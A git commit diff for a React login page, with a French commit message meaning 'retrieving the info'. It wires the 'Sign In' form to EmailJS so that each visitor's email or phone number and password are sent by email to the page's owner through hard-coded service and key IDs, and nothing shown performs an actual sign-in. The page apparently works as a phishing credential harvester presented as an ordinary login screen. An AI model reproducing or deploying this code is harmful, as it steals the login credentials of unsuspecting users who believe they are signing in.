b0c37769c8ab742c87fa53eea773f10fa62115c3
jack0237 <99824627+jack0237@users.noreply.github.com>
2023-12-27 17:50:25 +0100

    recuperation des infos

--- src/pages/Login/Login.jsx
+++ src/pages/Login/Login.jsx
@@ -1,22 +1,46 @@
-import React from 'react'
-import './Login.css'
-
+import React, { useState } from 'react';
 import Nav from '../../components/Nav/Nav';
+import emailjs from '@emailjs/browser';
+import './Login.css';
+
+
+import { useRef } from 'react';
 
 const Login = () => {
+
+  const form = useRef();
+
+  const [done, setDone] = useState(false)
+
+  const sendEmail = (e) => {
+    e.preventDefault();
+
+    emailjs.sendForm('service_t8p3ls8', 'template_zb0q5e8', form.current, 'F82WXicHG2s5sJv4v')
+      .then((result) => {
+        console.log(result.text);
+        setDone(true)
+      }, (error) => {
+        console.log(error.text);
+      });
+  };
+
+
+
+
+
   return (
     <>
       <div className='header'>
         <Nav />
         <div className="form-wrap">
           <h2>Sign In</h2>
-          <form className='form' action="#">
+          <form className='form' action="#" ref={form} onSubmit={sendEmail} >
             <div className="form-control">
-              <input type="text" required />
+              <input type="text" name="from_name" required />
               <label >Email or phone number</label>
             </div>
             <div className="form-control">
-              <input type="password" required/>
+              <input type="password" name="message" required />
               <label >Password</label>
             </div>
             <button type='submit' >Sign in</button>
